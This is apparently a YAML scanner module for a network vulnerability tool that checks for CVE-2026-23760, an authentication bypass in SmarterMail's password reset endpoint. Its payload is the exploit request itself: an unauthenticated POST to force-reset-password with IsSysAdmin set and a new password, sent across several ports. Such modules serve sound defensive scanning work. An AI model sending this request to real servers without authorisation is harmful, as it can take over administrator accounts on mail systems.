info:
  name: smartermail_cve_2026_23760_vuln
  author: Fayzulla Saurov
  severity: 9
  description: "CVE-2026-23760 - Authentication Bypass in SmarterMail Password Reset API. Allows unauthenticated attackers to reset administrator passwords by abusing the force-reset-password endpoint with IsSysAdmin parameter. Affects SmarterMail versions prior to Build 9511."
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2026-23760
    - https://labs.watchtowr.com/attackers-with-decompilers-strike-again-smartertools-smartermail-wt-2026-0001-auth-bypass/
    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  profiles:
    - vuln
    - http
    - critical_severity
    - cve
    - smartermail
    - auth_bypass

payloads:
  - library: http
    steps:
      - method: post
        timeout: 10
        headers:
          Content-Type: "application/json"
          User-Agent: "{user_agent}"
        allow_redirects: false
        ssl: false
        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}/api/v1/auth/force-reset-password"
            prefix: ""
            suffix: ""
            interceptors:
            data:
              schema:
                - "http"
                - "https"
              ports:
                - 80
                - 443
                - 9998
                - 9999
        data:
          type: json
          content:
            IsSysAdmin: true
            UserName: "nettacker-test"
            NewPassword: "nettacker-test-password"
        response:
          condition_type: or
          conditions:
            status_code:
              regex: "200|400|500"
              reverse: false
            content:
              regex: "IsSysAdmin|force-reset-password|SmarterMail|UserName|password"
              reverse: false
